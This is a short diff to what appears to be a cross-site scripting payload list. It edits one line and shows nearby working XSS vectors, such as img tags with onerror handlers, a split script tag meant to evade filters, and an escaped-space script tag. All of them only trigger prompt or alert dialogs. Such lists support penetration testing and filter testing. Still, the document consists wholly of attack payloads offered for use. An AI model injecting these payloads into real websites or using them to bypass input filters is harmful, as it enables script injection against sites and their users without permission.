@@ -12,7 +12,7 @@ XSS Payload List :
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
 <img src/onerror=prompt(8)>
-<image src =q onerror=prompt(8)>
+<image src =q onerror=prompt()>
 <img src =q onerror=prompt(8)>
 </scrip</script>t><img src =q onerror=prompt(8)>
 <script\x20type="text/javascript">javascript:alert(1);</script>
